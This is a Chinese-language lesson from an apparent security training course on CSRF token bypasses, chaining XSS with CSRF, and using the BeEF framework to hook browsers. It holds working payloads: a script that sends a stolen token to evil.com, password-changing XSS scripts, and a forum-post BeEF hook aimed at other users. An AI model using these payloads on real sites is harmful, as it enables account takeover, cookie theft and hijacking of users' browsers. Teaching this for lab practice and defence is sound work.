---
title: Day042：CSRF 防御绕过与 BeEF 框架
tags:
  - 网络安全
  - CSRF
  - BeEF
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d042
date: 2026-03-05
updated: 2026-01-28
---

# Day042：CSRF 防御绕过与 BeEF 框架

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | CSRF 绕过与 BeEF 浏览器控制 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现了一个 CSRF 漏洞，但目标网站使用了 CSRF Token 防护。同时你还有一个 XSS 漏洞没想好怎么利用。
>
> **问题**：能不能把 XSS 和 CSRF 结合起来，突破防御？
>
> **今天的任务**：学习 CSRF 高级绕过技巧，以及使用 BeEF 框架控制受害者浏览器。

---

## 今日目标

- [ ] 掌握 CSRF Token 绕过技巧
- [ ] 理解 XSS + CSRF 组合攻击
- [ ] 学会使用 BeEF 框架
- [ ] 完成浏览器控制实战

**闯关条件**：使用 BeEF 成功控制一个浏览器。

---

## 实战任务（先动手！）

### 任务 1：CSRF Token 绕过技巧（30 分钟）

**绕过方式 1：Token 验证缺陷**

```php
// 漏洞代码：Token 存在但未验证
if (isset($_POST['csrf_token'])) {
    // 有 token 就放行，没检查值
}

// 绕过：提交任意值
<input type="hidden" name="csrf_token" value="anything">
```

**绕过方式 2：Token 可删除**

```php
// 漏洞代码：只在 token 存在时验证
if (isset($_POST['csrf_token']) &&
    $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid token');
}

// 绕过：直接不提交 token 参数
```

**绕过方式 3：Token 绑定错误**

```php
// 漏洞：Token 未绑定用户会话
// 攻击者获取自己的有效 token，用于攻击他人
$valid_token = "attacker_token_123";
```

**记录**：
```
发现的 Token 验证缺陷：________________
```

---

### 任务 2：XSS + CSRF 组合攻击（40 分钟）

**场景**：利用 XSS 窃取 CSRF Token

**步骤 1：找到 XSS 点**
```html
<!-- 假设存在存储型 XSS -->
<script>
  // 读取页面中的 CSRF Token
  var token = document.querySelector('input[name="csrf_token"]').value;

  // 发送到攻击者服务器
  new Image().src = 'http://evil.com/steal?token=' + token;
</script>
```

**步骤 2：利用窃取的 Token 发起 CSRF**
```html
<script>
  var token = document.querySelector('input[name="csrf_token"]').value;

  // 创建隐藏表单
  var form = document.createElement('form');
  form.action = '/change-password';
  form.method = 'POST';
  form.innerHTML = `
    <input name="csrf_token" value="${token}">
    <input name="new_password" value="hacked123">
  `;
  document.body.appendChild(form);
  form.submit();
</script>
```

**完整 XSS Payload**：
```javascript
// 一步到位：读取 Token 并修改密码
(function(){
  var token = document.querySelector('[name="csrf_token"]').value;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/change-password', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('csrf_token=' + token + '&new_password=pwned123');
})();
```

**记录**：
```
XSS + CSRF 攻击成功：________________
```

---

### 任务 3：BeEF 框架入门（50 分钟）

**什么是 BeEF？**

BeEF（Browser Exploitation Framework）是一个专注于 Web 浏览器的渗透测试框架。通过在受害者浏览器中执行 hook.js，可以远程控制浏览器。

**安装 BeEF**（Kali Linux 自带）：
```bash
# 启动 BeEF
cd /usr/share/beef-xss
./beef

# 默认账户
# 用户名：beef
# 密码：beef
```

**BeEF 组件**：
- **控制面板**：http://127.0.0.1:3000/ui/panel
- **Hook 脚本**：http://127.0.0.1:3000/hook.js

**操作步骤**：
1. 启动 BeEF
2. 访问控制面板登录
3. 观察界面布局

**记录**：
```
BeEF 控制面板地址：________________
Hook 脚本地址：________________
```

---

### 任务 4：BeEF 浏览器控制实战（40 分钟）

**步骤 1：注入 Hook 脚本**

```html
<!-- 通过 XSS 注入 BeEF Hook -->
<script src="http://攻击者IP:3000/hook.js"></script>
```

**步骤 2：等待"上线"**

受害者访问包含 hook.js 的页面后，浏览器会在 BeEF 控制面板"上线"。

**步骤 3：执行命令模块**

BeEF 提供的常用模块：

| 模块 | 功能 |
|------|------|
| Get Cookie | 窃取 Cookie |
| Get Geolocation | 获取地理位置 |
| Webcam | 尝试访问摄像头 |
| Fake Notification | 伪造通知 |
| Redirect Browser | 重定向浏览器 |
| Social Engineering | 社会工程攻击 |

**实战测试**：
1. 在本地浏览器访问包含 hook.js 的页面
2. 在 BeEF 控制面板观察浏览器上线
3. 尝试执行 "Get Cookie" 模块
4. 尝试执行 "Alert Dialog" 弹窗

**记录**：
```
浏览器是否上线：________________
执行的模块：________________
获取的信息：________________
```

---

### 任务 5：BeEF + XSS 实战场景（30 分钟）

**场景**：通过存储型 XSS 投放 BeEF Hook

**攻击流程**：
```
1. 在论坛发帖，帖子内容包含：
   <script src="http://攻击者IP:3000/hook.js"></script>

2. 其他用户访问该帖子

3. 用户浏览器执行 hook.js，连接到 BeEF

4. 攻击者在 BeEF 控制面板看到新的"僵尸浏览器"

5. 可以对受害者执行各种操作
```

**高级利用**：
```javascript
// 配合 CSRF 攻击
// 在 BeEF 中执行自定义 JavaScript

// 读取当前页面的 CSRF Token
var token = document.querySelector('[name="csrf_token"]').value;

// 修改管理员密码
var form = document.createElement('form');
form.action = '/admin/change-password';
form.method = 'POST';
form.innerHTML = '<input name="csrf_token" value="' + token + '">' +
                 '<input name="password" value="hacked123">';
form.submit();
```

**记录**：
```
BeEF 利用场景：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 掌握 Token 绕过技巧 | 20 分 |
| 成功 XSS + CSRF 组合攻击 | 25 分 |
| 成功启动 BeEF | 15 分 |
| 成功控制浏览器 | 25 分 |
| 理解 BeEF 利用场景 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### CSRF Token 验证最佳实践

```php
// 正确的实现
// 1. 生成强随机 Token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 2. 验证时使用时间安全比较
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF validation failed');
}

// 3. 每次使用后刷新 Token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

### BeEF 架构

```
┌─────────────────────────────────────────┐
│              BeEF Server                │
│  ┌─────────────┐  ┌─────────────────┐  │
│  │ Web UI      │  │ Command Modules │  │
│  │ (控制面板)   │  │ (攻击模块)       │  │
│  └─────────────┘  └─────────────────┘  │
└──────────────────────────────────────────┘
              ↑ WebSocket ↓
┌─────────────────────────────────────────┐
│           受害者浏览器                    │
│  ┌─────────────────────────────────┐    │
│  │        hook.js (驻留脚本)         │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

### 常见 BeEF 模块分类

| 类别 | 模块示例 | 用途 |
|------|----------|------|
| 信息收集 | Get Cookie, Get Page HTML | 窃取数据 |
| 社会工程 | Fake Login, Fake Update | 钓鱼攻击 |
| 浏览器攻击 | Redirect, Hook Default Browser | 控制行为 |
| 网络攻击 | Port Scanner, Network Discovery | 内网探测 |
| 持久化 | Man-in-the-Browser | 长期控制 |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| BeEF 无法启动 | 端口被占用 | `lsof -i:3000`，关闭占用进程 |
| Hook.js 无法加载 | 跨域被阻止 | 确保攻击者 IP 可访问 |
| 浏览器不上线 | 网络不通 | 检查防火墙，确保 3000 端口开放 |
| 模块执行失败 | CSP 阻止 | 某些模块在 CSP 限制下无法工作 |

---

## 知识卡片速查

### CSRF Token 绕过速查

```
1. Token 存在但未验证 → 提交任意值
2. Token 可删除 → 不提交 token 参数
3. Token 未绑定会话 → 使用攻击者的有效 token
4. Token 在 URL 中 → 可能通过 Referer 泄露
5. 存在 XSS → 直接读取 Token
```

### BeEF 常用命令

```bash
# 启动 BeEF
./beef

# 配置文件
/usr/share/beef-xss/config.yaml

# 修改监听地址（允许远程访问）
host: "0.0.0.0"
```

### XSS + CSRF 组合 Payload

```javascript
// 读取 Token 并执行 CSRF
(function(){
  var t = document.querySelector('[name="csrf_token"]').value;
  var f = document.createElement('form');
  f.action = '/target-action';
  f.method = 'POST';
  f.innerHTML = '<input name="csrf_token" value="'+t+'">' +
                '<input name="param" value="malicious">';
  document.body.appendChild(f);
  f.submit();
})();
```

---

## 常见问题

**Q1：BeEF 只能用于攻击吗？**

A1：BeEF 是双刃剑：
- 攻击者用它控制受害者浏览器
- 安全人员用它测试 XSS 漏洞的危害程度
- 红队用它模拟真实攻击场景

**Q2：CSP 能防御 BeEF 吗？**

A2：能在一定程度上防御：
- 如果 CSP 禁止加载外部脚本，hook.js 无法加载
- 但如果存在 JSONP 或其他绕过点，仍可能被利用

**Q3：BeEF 的持久化是怎么实现的？**

A3：几种方式：
1. iframe 注入：在页面中嵌入隐藏 iframe
2. Man-in-the-Browser：劫持所有链接跳转
3. Pop-Under：创建隐藏的弹窗窗口

---

## 明日预告

**Day 043：BeEF 进阶与内网探测**

明天你将：
- 深入学习 BeEF 模块
- 利用浏览器进行内网探测
- 掌握社会工程攻击模块

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| BeEF 控制成功 | 是/否 |
| 执行的模块 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学到了两个重要的东西：
>
> 1. **漏洞组合**：单个 XSS 或 CSRF 可能影响有限，但组合起来威力倍增
> 2. **浏览器控制**：BeEF 让你看到 XSS 的真正威力——不是弹个窗那么简单
>
> BeEF 展示了"用户浏览器"可以成为一个持久的据点。只要用户不关闭页面，你就能持续控制他的浏览器。
>
> **记住：漏洞的价值不在于它本身，而在于你能用它做什么**。

```bash
echo "Day 042 Complete! BeEF 浏览器控制解锁！"
```
